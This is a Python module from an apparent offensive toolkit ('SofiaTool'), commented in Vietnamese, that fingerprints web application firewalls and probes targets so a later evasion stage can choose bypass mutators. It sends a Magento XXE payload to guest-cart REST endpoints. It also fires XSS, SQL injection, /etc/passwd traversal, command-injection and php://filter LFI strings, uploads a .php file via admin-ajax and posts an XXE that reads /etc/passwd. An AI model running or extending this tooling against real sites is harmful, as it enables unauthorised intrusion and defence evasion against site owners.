"""SofiaTool v2 — PHA 3: WAF detection (per target).

Bản nâng cấp (giữ NGUYÊN API cũ để không phá sofia.py / nhánh Magento):

  * `WAF_SIGNATURES` mở rộng thêm nhiều engine (wordfence, imunify360,
    patchstack, malcare, cerber, wallarm, signal-sciences, distil, sitelock,
    qrator, radware, reblaze, stackpath, bunny, keycdn, arvancloud, openappsec,
    ninjafirewall, ...).
  * `passive_fingerprint()`  — headers + block-page HTML (API cũ giữ nguyên).
  * `active_probe()`         — XXE/Magento cho 4 endpoint (API cũ giữ nguyên).
  * `detect()`               — {engine, engines, blocks_xml, blocked_endpoints}.
  * `is_blocked()`   (MỚI)   — chuẩn hoá nhận diện phản hồi bị WAF chặn; dùng
                               chung cho cả nhánh Magento lẫn WordPress.
  * `detect_wp()`    (MỚI)   — fingerprint + probe theo LỚP payload WordPress
                               (xss / sqli / traversal / rce / upload / xml).
                               Kết quả dùng để `waf.evasion` chọn mutator.
"""

import re

import requests
import urllib3

from core import config
from core.logger import get_logger

log = get_logger()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WAF_SIGNATURES = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid", "server: cloudflare"],
        "body": re.compile(r"cloudflare|cf-error-details|__cf_chl_", re.I),
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amzn-waf-action", "x-amz-cf-id"],
        "body": re.compile(r"awswaf|Request blocked by AWS WAF", re.I),
    },
    "imperva": {
        "headers": ["x-iinfo", "x-cdn", "incap_ses", "visid_incap"],
        "body": re.compile(r"imperva|incapsula", re.I),
    },
    "akamai": {
        "headers": ["x-akamai-transformed", "x-akamai-request-id"],
        "body": re.compile(r"akamai|_abck=|bm_sz=", re.I),
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache", "sucuri_cloudproxy"],
        "body": re.compile(r"sucuri|cloudproxy", re.I),
    },
    "modsecurity": {
        "headers": ["x-modsec", "server: mod_security"],
        "body": re.compile(r"mod_security|modsecurity|error id: \d+", re.I),
    },
    "cloudbric": {
        "headers": ["x-cbwaf", "cloudbric"],
        "body": re.compile(r"cloudbric", re.I),
    },
    "bitninja": {
        "headers": ["x-bitninja", "bitninja"],
        "body": re.compile(r"bitninja", re.I),
    },
    "fastly": {
        "headers": ["x-fastly-request-id", "fastly-io", "x-served-by: cache-",
                    "server: fastly"],
        "body": re.compile(r"fastly|via: 1.1 varnish", re.I),
    },
    "azure": {
        "headers": ["x-ms-request-id", "x-azure-ref", "x-msedge-ref",
                    "azurefd", "server: kestrel"],
        "body": re.compile(r"azure|front door|microsoft azure", re.I),
    },
    "f5": {
        "headers": ["x-f5-asm", "x-wa-info", "server: bigip", "x-cnection"],
        "body": re.compile(r"big-?ip|f5 networks|asm#\d+|security policy violation", re.I),
    },
    "barracuda": {
        "headers": ["x-barracuda", "set-cookie: barra_counter_session",
                    "set-cookie: barra_vid"],
        "body": re.compile(r"barracuda", re.I),
    },
    "wordfence": {
        "headers": ["x-wordfence", "set-cookie: wfvt_",
                    "set-cookie: wordfence_verifiedHuman"],
        "body": re.compile(r"wordfence|blocked by wordfence|wf\b.{0,20}firewall", re.I),
    },
    "yundun": {
        "headers": ["x-yundun", "aliyundun", "x-aliyundun"],
        "body": re.compile(r"yundun|阿里云盾|aliyun waf", re.I),
    },
    "safedog": {
        "headers": ["safedog-flow-item", "set-cookie: safedog-flow-item",
                    "x-safedog"],
        "body": re.compile(r"safedog|安全狗", re.I),
    },
    "360wzws": {
        "headers": ["360wzws", "x-360-wzws", "x-wzws"],
        "body": re.compile(r"360wzws|网站卫士", re.I),
    },
    "gcore": {
        "headers": ["x-gcore", "server: gcore"],
        "body": re.compile(r"gcore", re.I),
    },
    "ddosguard": {
        "headers": ["x-ddos-guard", "ddos-guard", "server: ddos-guard"],
        "body": re.compile(r"ddos-?guard", re.I),
    },
    "cloudfront": {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop", "x-cache: cloudfront"],
        "body": re.compile(r"cloudfront", re.I),
    },
    "varnish": {
        "headers": ["x-varnish", "x-vcl", "via: varnish"],
        "body": re.compile(r"varnish|vcl error", re.I),
    },
    "litespeed": {
        "headers": ["x-litespeed-cache", "server: litespeed", "x-litespeed"],
        "body": re.compile(r"litespeed", re.I),
    },
    "citrix": {
        "headers": ["x-ns-", "set-cookie: citrix_ns_id", "set-cookie: ns_af"],
        "body": re.compile(r"netscaler|citrix", re.I),
    },
    # --- bổ sung: WAF/CDN phổ biến trong hệ WordPress/WooCommerce ---------------
    "imunify360": {
        "headers": ["x-imunify", "server: imunify360-webshield",
                    "set-cookie: imunify360"],
        "body": re.compile(r"imunify|webshield|access denied.{0,40}imunify", re.I),
    },
    "patchstack": {
        "headers": ["x-patchstack", "x-patchstack-rule"],
        "body": re.compile(r"patchstack|blocked by patchstack", re.I),
    },
    "malcare": {
        "headers": ["x-malcare", "malcare-waf"],
        "body": re.compile(r"malcare", re.I),
    },
    "cerber": {
        "headers": ["x-cerber", "wp-cerber"],
        "body": re.compile(r"wp-?cerber|cerber security", re.I),
    },
    "ninjafirewall": {
        "headers": ["x-ninjafirewall", "ninjafirewall"],
        "body": re.compile(r"ninjafirewall|nfw-", re.I),
    },
    "all-in-one-security": {
        "headers": ["x-aios", "server: aios"],
        "body": re.compile(r"all in one wp security|aios", re.I),
    },
    "wallarm": {
        "headers": ["x-wallarm", "server: nginx-wallarm"],
        "body": re.compile(r"wallarm|request blocked.{0,40}wallarm", re.I),
    },
    "signal_sciences": {
        "headers": ["x-sigsci", "x-sig-sci", "server: sigsci"],
        "body": re.compile(r"signal sciences|sigsci", re.I),
    },
    "distil": {
        "headers": ["x-distil-cs", "set-cookie: x-distil"],
        "body": re.compile(r"distil", re.I),
    },
    "sitelock": {
        "headers": ["x-sitelock", "sitelock"],
        "body": re.compile(r"sitelock", re.I),
    },
    "qrator": {
        "headers": ["x-qrator", "server: qrator"],
        "body": re.compile(r"qrator", re.I),
    },
    "radware": {
        "headers": ["x-rdwr", "server: radware"],
        "body": re.compile(r"radware|appwall|unauthorized activity", re.I),
    },
    "reblaze": {
        "headers": ["x-reblaze", "rbzid"],
        "body": re.compile(r"reblaze|rbzid", re.I),
    },
    "stackpath": {
        "headers": ["x-sp-", "server: stackpath"],
        "body": re.compile(r"stackpath", re.I),
    },
    "bunny": {
        "headers": ["server: bunnycdn", "x-bunnycdn"],
        "body": re.compile(r"bunnycdn|bunny\.net", re.I),
    },
    "keycdn": {
        "headers": ["x-keycdn", "server: keycdn"],
        "body": re.compile(r"keycdn", re.I),
    },
    "arvancloud": {
        "headers": ["x-arvan", "server: arvancloud", "ar-"],
        "body": re.compile(r"arvancloud", re.I),
    },
    "openappsec": {
        "headers": ["x-openappsec", "server: openappsec"],
        "body": re.compile(r"openappsec|appsec", re.I),
    },
    "openresty": {
        "headers": ["server: openresty"],
        "body": re.compile(r"openresty", re.I),
    },
}

# Trạng thái HTTP thường gặp khi WAF chặn
_BLOCK_STATUS = {403, 406, 429}
_FIX_STATUS = {503}  # SanSec emergency fix: 503 cho body chứa "sourceData"

# Regex body cho trang/challenge chặn — dùng chung cho is_blocked()
_BLOCK_BODY = re.compile(
    r"(?:request|access|you|your\s+(?:request|access))\b[^.\n]{0,60}?\bblocked\b"
    r"|blocked by (?:wordfence|cloudflare|sucuri|mod_?security|patchstack|"
    r"imunify|malcare|wallarm|akamai|imperva|incapsula|aws|barracuda|f5|"
    r"ddos-?guard|qrator|radware|reblaze|stackpath|bitninja|safedog)"
    r"|not acceptable|cf-error-details|__cf_chl|attention required|"
    r"just a moment|checking your browser|security policy violation|"
    r"web application firewall|malicious (?:request|activity)|"
    r"mod_security|error id: \d+|página bloqueada|acceso denegado"
    r"|the request was rejected|request rejected|forbidden by",
    re.I)

# Probe endpoints — khớp normalized key với exploit/endpoints.rotation (skip).
_PROBE_ENDPOINTS = [
    "/rest/V1/guest-carts/{cart}/estimate-shipping-methods",
    "/rest/all/V1/guest-carts/{cart}/estimate-shipping-methods",
    "/rest/V1/guest-carts/{cart}/billing-address",
    "/rest/V1/guest-carts/{cart}/totals-information",
]
_PROBE_CART = "sofia-probe"


# ---------------------------------------------------------------- is_blocked ---
def is_blocked(resp, body=None, statuses=None, include_5xx=False):
    """True nếu phản hồi trông như bị WAF chặn.

    - statuses: tập mã chặn tuỳ chỉnh (mặc định {403,406,429,501}).
    - include_5xx: coi 503/500 + body chặn là bị chặn (dùng khi biết 5xx là do WAF).
    """
    if resp is None:
        return False
    status = getattr(resp, "status_code", None)
    block_status = set(statuses) if statuses is not None else {403, 406, 429, 501}
    if status in block_status:
        return True
    txt = body if body is not None else (getattr(resp, "text", "") or "")
    if status in _FIX_STATUS or (status and 500 <= status < 600):
        if _BLOCK_BODY.search(txt[:20000]):
            return True
        if include_5xx and status in (502, 503, 504, 520, 521, 522, 524):
            return True
    if _BLOCK_BODY.search(txt[:20000]):
        # chỉ tin body khi status "không bình thường" để tránh dương tính giả
        if status and status >= 400:
            return True
    return False


# --------------------------------------------------------- passive fingerprint --
def passive_fingerprint(base, sess=None):
    """Trả danh sách engine WAF phát hiện được từ headers + block-page HTML."""
    sess = sess or requests.Session()
    timeout = getattr(sess, "request_timeout", None) or config.TIMEOUT
    found = []
    try:
        r = sess.get(base + "/", timeout=timeout, verify=False,
                     headers={"User-Agent": config.USER_AGENT})
        headers = {k.lower(): v for k, v in r.headers.items()}
        body = r.text[:150_000]
        for engine, sig in WAF_SIGNATURES.items():
            hit = False
            for h in sig["headers"]:
                h = h.lower()
                if ":" in h:  # dạng "server: cloudflare"
                    name, _, val = h.partition(":")
                    if headers.get(name.strip()) and val.strip() in headers[name.strip()].lower():
                        hit = True
                        break
                elif h in headers:
                    hit = True
                    break
                elif h.startswith("set-cookie:"):
                    cookie = headers.get("set-cookie", "")
                    if h.split(":", 1)[1].strip() in cookie.lower():
                        hit = True
                        break
            if not hit and sig["body"].search(body):
                hit = True
            if hit and engine not in found:
                found.append(engine)
    except requests.RequestException as e:
        log.debug("passive fingerprint fail: %s", e)
    return found


def _probe_body():
    """Body XML rõ ràng (không callback thật, URL nội bộ không tồn tại)."""
    return {
        "address": {
            "totalsCollector": {
                "collectorList": {
                    "totalCollector": {
                        "sourceData": {
                            "data": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://127.0.0.1:1/x.dtd"> %sp; %param1;]><r/>',
                            "options": 12345678,
                        }
                    }
                }
            }
        }
    }


def active_probe(base, sess=None):
    """Gửi XML payload tới 4 endpoint Magento — endpoint nào bị WAF chặn/fix.

    Trả (blocks_xml, blocked_endpoints):
      blocks_xml        — có endpoint nào chặn/fix body XML không
      blocked_endpoints — list normalized endpoint key bị chặn (rotation skip)
    """
    sess = sess or requests.Session()
    import json as _json
    body = _json.dumps(_probe_body())
    timeout = getattr(sess, "request_timeout", None) or config.TIMEOUT
    blocked = []
    for tpl in _PROBE_ENDPOINTS:
        ep = tpl.format(cart=_PROBE_CART)
        try:
            r = sess.post(
                f"{base}{ep}", data=body.encode("utf-8"),
                timeout=timeout, verify=False,
                headers={"Content-Type": "application/json",
                         "User-Agent": config.USER_AGENT},
            )
        except requests.RequestException:
            continue
        is_block = r.status_code in _BLOCK_STATUS or (
            r.status_code in _FIX_STATUS and "sourceData" in body) or is_blocked(r)
        if is_block:
            blocked.append(tpl.format(cart="{cart}"))
            log.info("probe: endpoint BLOCKED/FIXED (%s) %s", r.status_code, ep)
    blocks_xml = bool(blocked)
    if blocks_xml:
        log.info("probe: %d/%d endpoint chặn XML body (%s)",
                 len(blocked), len(_PROBE_ENDPOINTS), base)
    return blocks_xml, blocked


def detect(base, sess=None):
    """Kết hợp: trả dict {engine, engines, blocks_xml, blocked_endpoints}."""
    engines = passive_fingerprint(base, sess)
    blocks_xml, blocked_endpoints = active_probe(base, sess)
    engine = engines[0] if engines else None
    log.info("WAF detect %s -> engine=%s blocks_xml=%s blocked=%d",
             base, engine, blocks_xml, len(blocked_endpoints))
    return {"engine": engine, "engines": engines, "blocks_xml": blocks_xml,
            "blocked_endpoints": blocked_endpoints}


# ------------------------------------------------------------ WP-class probes --
# Probe theo LỚP payload: mỗi lớp 1 request "ồn ào" đủ để WAF lộ diện.
_WP_GET_PROBES = {
    "xss": {"q": "<script>alert(1)</script>", "s": "<img src=x onerror=alert(1)>"},
    "sqli": {"s": "1' UNION SELECT NULL,NULL-- -", "q": "1) OR 1=1-- -"},
    "traversal": {"file": "../../../../etc/passwd", "path": "..%2f..%2f..%2fetc%2fpasswd"},
    "rce": {"cmd": ";id;", "exec": "|id"},
    "lfi": {"page": "php://filter/convert.base64-encode/resource=index.php"},
}

_WP_UPLOAD_NAME = "sofia_waf_probe.php"
_WP_XML_BODY = ('<?xml version="1.0"?><!DOCTYPE r ['
                '<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>')


def detect_wp(base, sess=None, timeout=None):
    """Fingerprint + probe theo lớp payload WordPress.

    Trả dict:
      engine           — engine đầu tiên nhận diện được (hoặc None)
      engines          — list engine
      blocked          — True nếu có ít nhất 1 lớp bị chặn
      blocked_classes  — list lớp bị chặn: xss/sqli/traversal/rce/lfi/upload/xml
      statuses         — dict lớp -> HTTP status quan sát được
    """
    sess = sess or requests.Session()
    timeout = timeout or getattr(sess, "request_timeout", None) or config.TIMEOUT
    ua = config.USER_AGENT
    engines = passive_fingerprint(base, sess)
    statuses = {}
    blocked_classes = []

    def _note(cls, resp):
        statuses[cls] = resp.status_code
        if is_blocked(resp):
            blocked_classes.append(cls)
            log.info("detect_wp: lớp '%s' bị chặn (%s)", cls, resp.status_code)

    for cls, params in _WP_GET_PROBES.items():
        try:
            r = sess.get(base + "/", params=params, timeout=timeout, verify=False,
                         headers={"User-Agent": ua})
        except requests.RequestException:
            continue
        _note(cls, r)

    # lớp upload: multipart với tên file .php
    try:
        files = {"file": (_WP_UPLOAD_NAME, b"<?php echo 7*7; ?>",
                          "application/octet-stream")}
        r = sess.post(base + "/wp-admin/admin-ajax.php", files=files,
                      data={"action": "sofia_waf_probe"}, timeout=timeout,
                      verify=False, headers={"User-Agent": ua})
        _note("upload", r)
    except requests.RequestException:
        pass

    # lớp xml (XXE) — dùng admin-ajax + REST
    for ep in ("/wp-admin/admin-ajax.php", "/wp-json/wp/v2/posts"):
        try:
            r = sess.post(base + ep, data={"action": "sofia_waf_probe",
                                           "data": _WP_XML_BODY},
                          timeout=timeout, verify=False,
                          headers={"User-Agent": ua})
            _note("xml", r)
            break
        except requests.RequestException:
            continue

    blocked_classes = sorted(set(blocked_classes))
    out = {
        "engine": engines[0] if engines else None,
        "engines": engines,
        "blocked": bool(blocked_classes),
        "blocked_classes": blocked_classes,
        "statuses": statuses,
    }
    log.info("WAF detect_wp %s -> engine=%s blocked=%s",
             base, out["engine"], blocked_classes)
    return out
